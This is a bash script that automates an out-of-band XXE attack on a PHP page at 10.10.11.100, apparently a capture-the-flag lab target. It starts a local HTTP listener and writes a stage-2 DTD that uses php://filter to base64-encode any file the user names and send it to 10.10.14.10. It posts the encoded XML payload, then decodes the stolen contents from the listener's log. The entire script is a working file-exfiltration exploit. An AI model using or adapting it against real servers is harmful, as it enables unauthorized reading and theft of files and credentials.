#!/bin/bash

function initialize_py_server { 
	mkdir -p {./php_xxe_lfi/http_logs,./php_xxe_lfi/exfil}
	echo 'Initializing Python HTTP server...'
	python3 -m http.server 80 &> ./php_xxe_lfi/http_logs/requests.log &
	RESULT=$?
	if [ $RESULT -eq 0 ]; then
		sleep 0.5
		echo 'HTTP server successfully started on port 80.'
	else
	        echo 'HTTP server did not start. Exiting gracefully...'
	        kill_py_server
	        exit
	fi
}

function kill_py_server {
        python_processes=$(ps aux | grep 'python3 -m http.server 80' | grep -v 'grep' | awk '{print $2}')
        for i in $python_processes
        do
                sudo kill $i
        done
}

get_file() { 

	stage2=$(echo $'<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource='"$1"$'">\n<!ENTITY % param1 "<!ENTITY exfil SYSTEM \'http://10.10.14.10/lfi-stage2.xml?%data;\'>">')
	if [ "$1" == "" ]
	then
		echo "No file requested."
	else
		echo $stage2 > lfi-stage2.xml
		curl -i -s -k -X $'POST' \
		    -H $'Host: 10.10.11.100' -H $'Content-Length: 223' -H $'Accept: */*' -H $'X-Requested-With: XMLHttpRequest' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36' -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'Origin: http://10.10.11.100' -H $'Referer: http://10.10.11.100/log_submit.php' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' \
		        --data-binary $'data=PD94bWwgdmVyc2lvbj0iMS4wIiA/Pg0KPCFET0NUWVBFIHIgWw0KPCFFTEVNRU5UIHIgQU5ZID4NCjwhRU5USVRZICUgc3AgU1lTVEVNICJodHRwOi8vMTAuMTAuMTQuMTAvbGZpLXN0YWdlMi54bWwiPg0KJXNwOw0KJXBhcmFtMTsNCl0%2bDQo8dGl0bGU%2bJmV4ZmlsOzwvdGl0bGU%2b' \
			    $'http://10.10.11.100/tracker_diRbPr00f314.php' &> /dev/null
	fi
}

function main { 
#kill http server if currently running on port 80
kill_py_server
initialize_py_server
while true
do
	echo -n "Enter desired file: "
	read FILENAME
	if [ "$FILENAME" == "exit" ];
	then
		echo "Goodbye..."
		kill_py_server
		exit
	else
		get_file $FILENAME
		cat ./php_xxe_lfi/http_logs/requests.log | tail -1 | awk -F"?" '{print $2}' | awk '{print $1}' | base64 -d
	fi
done
}

main
